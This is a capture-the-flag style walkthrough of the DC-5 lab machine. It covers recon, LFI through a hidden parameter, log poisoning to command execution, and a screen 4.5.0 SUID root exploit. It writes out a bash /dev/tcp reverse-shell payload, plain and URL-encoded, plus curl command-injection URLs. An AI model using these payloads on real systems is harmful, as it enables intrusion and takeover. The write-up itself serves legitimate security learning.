<p>This box proved to be quite engaging for me. The initial foothold presented an interesting challenge. Understanding the application’s workflow and identifying a hidden parameter vulnerable to LFI with code execution capabilities was crucial. Since file uploads were not possible, I opted for a log poisoning attack to achieve command injection. This sequence, starting with log poisoning and leading to command injection, allowed for the initial foothold. The privilege escalation was straightforward, involving the exploitation of a SUID binary for which a publicly available exploit already exists.</p>

<h1 id="information-gathering">Information Gathering</h1>

<p>First, I want to start with Nmap to identify the open ports and their associated services. If possible, Nmap will also provide information about the service versions and the operating system. This is a good starting point when working with any assets.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> <span class="nv">$IP</span> | <span class="nb">grep</span> ^[0-9] | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span> <span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> nmap/service_scan <span class="nv">$IP</span>

PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|<span class="k">*</span>http-title: Welcome
111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33051/tcp   status
|   100024  1          42452/tcp6  status
|   100024  1          45427/udp   status
|<span class="k">*</span>   100024  1          47008/udp6  status
33051/tcp open  status  1 <span class="o">(</span>RPC <span class="c">#100024)</span>
</code></pre></div></div>

<p>From the Nmap results, we identified three open ports. However, the only port of interest is port 80, where the Nginx server is listening. Let’s delve into the web application.</p>

<p><strong>Manual Inspection</strong></p>

<p><img src="/assets/images/dc-5/1.png" alt="" /></p>

<p>The default homepage has a navbar, but aside from the ‘Contact’ tab, nothing is interesting to me at the moment. Before we dive deeper into the application, I would like to run a wfuzz fuzzing to discover hidden files.</p>

<p><strong>Fuzzing</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt <span class="nt">--hc</span> 404 <span class="s2">"</span><span class="nv">$URL</span><span class="s2">”

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================
000000001:   200        53 L     525 W      4024 Ch     "</span>index.php<span class="s2">"
000000043:   200        57 L     752 W      5644 Ch     "</span>faq.php<span class="s2">"
000000106:   200        71 L     479 W      4281 Ch     "</span>contact.php
000000482:   200        42 L     66 W       851 Ch      <span class="s2">"thankyou.php"</span>
000001951:   200        53 L     560 W      4291 Ch     <span class="s2">"about-us.php"</span>
000016294:   200        51 L     525 W      4099 Ch     <span class="s2">"solutions.php"</span>
</code></pre></div></div>

<p>During the fuzzing process, the file that caught our interest is ‘thankyou.php.’ When we fill out all the information in the contact.php form and click the submit button, all the data will be processed inside the thankyou.php file through a GET request.</p>

<p><img src="/assets/images/dc-5/2.png" alt="" /></p>

<p>Let’s inspect this URL more closely to understand and find out if there is any way to get in. After analyzing the URL, I didn’t find any vulnerability with any of the parameters. Since it’s an intentionally vulnerable box, there is a high possibility of having a vulnerability. However, I have not tried parameter finding yet. So, let’s check if there is any hidden parameter for the back-end. For this task, I would like to use WFUZZ tools.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt <span class="nt">--hc</span> 404 <span class="nt">--hh</span> 851 <span class="s2">"</span><span class="nv">$URL</span><span class="s2">”

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================
000002206:   200        42 L     63 W       835 Ch      "</span>file<span class="s2">"
</span></code></pre></div></div>

<p>There is a hidden parameter called <code class="language-plaintext highlighter-rouge">file</code>, acting like a light in the darkness. I decided to try viewing the /etc/passwd file, and it worked.</p>

<p><img src="/assets/images/dc-5/3.png" alt="" /></p>

<p>Now that we have LFI, allowing us to read files, we need to confirm the extent of this vulnerability. If we can only read the data, that’s helpful, but if we can also execute files, we might gain control of the system. Let’s first confirm the capability. I’ll attempt to call the index file. If we receive back the raw code, it means we can only read the code. If we see the furnished web application, it indicates code execution as well.</p>

<p><img src="/assets/images/dc-5/4.png" alt="" /></p>

<p>As we can see from the furnished output, it’s confirmed that the LFI also has the capability to execute the code. Now, we need to find a way to gain access to the system using this LFI vulnerability. I would like to check all the files accessible through this LFI vulnerability, so I’ll run wfuzz again.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt <span class="nt">--hc</span> 404 <span class="nt">--hh</span> 835 <span class="s2">"</span><span class="nv">$URL</span><span class="s2">”

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================                          
000000124:   200        58 L     152 W      1546 Ch     "</span>/etc/apt/sources.list<span class="s2">"                                                                                    
000000116:   200        263 L    1162 W     7950 Ch     "</span>/etc/apache2/apache2.conf<span class="s2">"                                                                                
000000133:   200        96 L     117 W      1558 Ch     "</span>/etc/group<span class="s2">"                                                                                               
000000130:   200        54 L     151 W      1499 Ch     "</span>/etc/fstab<span class="s2">"                                                                                               
000000203:   200        52 L     120 W      1246 Ch     "</span>/etc/hosts.allow<span class="s2">"                                                                                         
000000204:   200        59 L     174 W      1546 Ch     "</span>/etc/hosts.deny<span class="s2">"                                                              
000000126:   200        57 L     187 W      1557 Ch     "</span>/etc/crontab<span class="s2">"                                                                                             
000000200:   200        49 L     85 W       1019 Ch     "</span>/etc/hosts<span class="s2">"                                    
000000252:   200        70 L     104 W      2319 Ch     "</span>/etc/passwd<span class="s2">"                                      
000000245:   200        62 L     124 W      1332 Ch     "</span>/etc/nsswitch.conf<span class="s2">"                                
000000244:   200        61 L     166 W      1602 Ch     "</span>/etc/netconfig<span class="s2">"                                                                                           
000000241:   200        49 L     103 W      1121 Ch     "</span>/etc/motd<span class="s2">"                                                                                                
000000243:   200        170 L    590 W      4368 Ch     "</span>/etc/mysql/my.cnf<span class="s2">"                                                                                        
000000232:   200        44 L     68 W       861 Ch      "</span>/etc/issue<span class="s2">"                                                                                               
000000231:   200        466 L    1334 W     11019 Ch    "</span>/etc/init.d/apache2<span class="s2">"                  
000000394:   200        45 L     69 W       898 Ch      "</span>/etc/resolv.conf<span class="s2">"                                                                                         
000000395:   200        82 L     180 W      1722 Ch     "</span>/etc/rpc<span class="s2">"                                                                                                 
000000422:   200        46 L     98 W       1114 Ch     "</span>/etc/updatedb.conf<span class="s2">"                                                                                       
000000417:   200        130 L    376 W      3376 Ch     "</span>/etc/ssh/sshd_config<span class="s2">"                                                                                     
000000492:   200        68 L     230 W      1778 Ch     "</span>/proc/cpuinfo<span class="s2">"                                                                                            
000000500:   200        64 L     402 W      4135 Ch     "</span>/proc/net/tcp<span class="s2">"                                                                                            
000000505:   200        43 L     78 W       972 Ch      "</span>/proc/version<span class="s2">"                                                                                            
000000504:   200        83 L     164 W      1620 Ch     "</span>/proc/self/status<span class="s2">"                                                                                        
000000501:   200        49 L     87 W       1011 Ch     "</span>/proc/partitions<span class="s2">"                                                                                         
000000502:   200        42 L     66 W       908 Ch      "</span>/proc/self/cmdline<span class="s2">"                                                                                       
000000498:   200        46 L     117 W      1281 Ch     "</span>/proc/net/dev<span class="s2">"                                                                                            
000000499:   200        45 L     96 W       1219 Ch     "</span>/proc/net/route<span class="s2">"                                                                                          
000000497:   200        46 L     90 W       1145 Ch     "</span>/proc/net/arp<span class="s2">"                                                                                            
000000494:   200        43 L     68 W       861 Ch      "</span>/proc/loadavg<span class="s2">"                                                                                            
000000496:   200        67 L     213 W      2603 Ch     "</span>/proc/mounts<span class="s2">"                                                                                             
000000495:   200        86 L     191 W      2061 Ch     "</span>/proc/meminfo<span class="s2">"                                                                                            
000000493:   200        104 L    379 W      3735 Ch     "</span>/proc/interrupts<span class="s2">"
000000693:   200        47 L     69 W       293123 Ch   "</span>var/log/nginx/access.log<span class="s2">"                                 
000000694:   200        42 L     68 W       293123 Ch   "</span>/var/log/lastlog<span class="s2">"                                                                                         
000000736:   200        46 L     88 W       13877 Ch    "</span>/var/log/wtmp<span class="s2">"                                                                                            
000000745:   200        44 L     70 W       1987 Ch     "</span>/var/run/utmp<span class="s2">"                                                                                            
</span></code></pre></div></div>

<p>We now have access to all these important files on this machine. One of the most interesting files is var/log/nginx/access.log. This file stores all the requests made to the server, along with the corresponding URLs. At this point, my idea is to attempt log poisoning. If we make a request with PHP code inside the URL, the response will be 404, but the PHP code will be present in the log file. As we observed earlier, the LFI also executes code. Therefore, when we access the file during the execution process, the code will be executed.</p>

<p><img src="/assets/images/dc-5/5.png" alt="" /></p>

<p>We wrote a command injection vulnerable code that will be stored inside the log file. During the opening of the file, we should get command execution. Now, let’s verify the command injection.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="o">[</span>http://192.168.197.133/thankyou.php?file<span class="o">=</span>/var/log/nginx/access.log&amp;cmd<span class="o">=</span>ping]<span class="o">(</span>http://192.168.197.133/thankyou.php?file<span class="o">=</span>/var/log/nginx/access.log&amp;cmd<span class="o">=</span>ping<span class="o">)</span> 192.168.197.131
</code></pre></div></div>

<p>We made a curl request with our desired URL. Here, ‘file=/var/log/nginx/access.log’ reads the log file, and ‘cmd=ping 192.168.197.131’ is the command for pinging my local machine, which will verify the command injection. To confirm, we can run a listener on our attack box.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> eth0 <span class="nt">-c5</span> icmp

Response
tcpdump: verbose output suppressed, use <span class="nt">-v</span><span class="o">[</span>v]... <span class="k">for </span>full protocol decode
listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, snapshot length 262144 bytes
03:49:14.643611 IP 192.168.197.133 <span class="o">&gt;</span> 192.168.197.131: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>1799, <span class="nb">seq </span>9817, length 64
03:49:14.643690 IP 192.168.197.131 <span class="o">&gt;</span> 192.168.197.133: ICMP <span class="nb">echo </span>reply, <span class="nb">id </span>1799, <span class="nb">seq </span>9817, length 64
03:49:15.285594 IP 192.168.197.133 <span class="o">&gt;</span> 192.168.197.131: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>2258, <span class="nb">seq </span>400, length 64
03:49:15.285628 IP 192.168.197.131 <span class="o">&gt;</span> 192.168.197.133: ICMP <span class="nb">echo </span>reply, <span class="nb">id </span>2258, <span class="nb">seq </span>400, length 64
03:49:15.645248 IP 192.168.197.133 <span class="o">&gt;</span> 192.168.197.131: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>1799, <span class="nb">seq </span>9818, length 64
5 packets captured
6 packets received by filter
0 packets dropped by kernel
</code></pre></div></div>

<p>We received an ICMP request back, which means the command execution was successful. Now, we can attempt to establish a reverse shell.</p>

<h1 id="initial-foothold">Initial Foothold</h1>

<p>Here, we use a one-liner bash reverse shell. We need to encode the shell into URL encoding format to avoid bad characters since we are using a browser.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Reverse shell
bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/192.168.197.131/9001 0&gt;&amp;1'</span>

Full Payload
<span class="o">[</span>http://192.168.197.133/thankyou.php?file<span class="o">=</span>/var/log/nginx/access.log&amp;cmd<span class="o">=</span>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;%26 %2Fdev%2Ftcp%2F192.168.197.131%2F9001 0&gt;%261'</span><span class="o">](</span>http://192.168.197.133/thankyou.php?file<span class="o">=</span>/var/log/nginx/access.log&amp;cmd<span class="o">=</span>bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.197.131%2F9001%200%3E%261%27<span class="o">)</span>
</code></pre></div></div>

<p><img src="/assets/images/dc-5/6.png" alt="" /></p>

<p>We obtained the reverse shell, successfully gaining the initial foothold.</p>

<h1 id="privilege-escalation">Privilege Escalation</h1>

<p>After obtaining the shell, I attempted to locate sensitive files, check privileges, and identify misconfigurations, but I did not find anything noteworthy. I then tried searching for GUIDs, but nothing interesting turned up. Finally, I explored SUID and discovered ‘screen 4.5.0,’ which seemed intriguing to me. I decided to investigate further.</p>

<p><img src="/assets/images/dc-5/7.png" alt="" /></p>

<p>From the exploitDB database i found privilege escalation script.</p>

<p><img src="/assets/images/dc-5/8.png" alt="" /></p>

<p>here i download the script using searchsploit kali linux builtin tools from exploit DB.</p>

<p><img src="/assets/images/dc-5/9.png" alt="" /></p>

<p>I start a python http server to transfer the payload to the victim machine.</p>

<p><img src="/assets/images/dc-5/10.png" alt="" /></p>

<p>from the victim machine i saw there is wget so its easier to download through wget.</p>

<p><img src="/assets/images/dc-5/11.png" alt="" /></p>

<p>Through wget i download the file to victim machine.</p>

<p><img src="/assets/images/dc-5/12.png" alt="" /></p>

<p>I made the file executable, ran it as is, and now I have root access.</p>

<p><img src="/assets/images/dc-5/13.png" alt="" /></p>

<p>The privilege escalation was quite easy. There wasn’t anything complex; I just needed to find the right payload, transfer it to the victim computer, make it executable, and execute it. The permissions were then changed to root.</p>
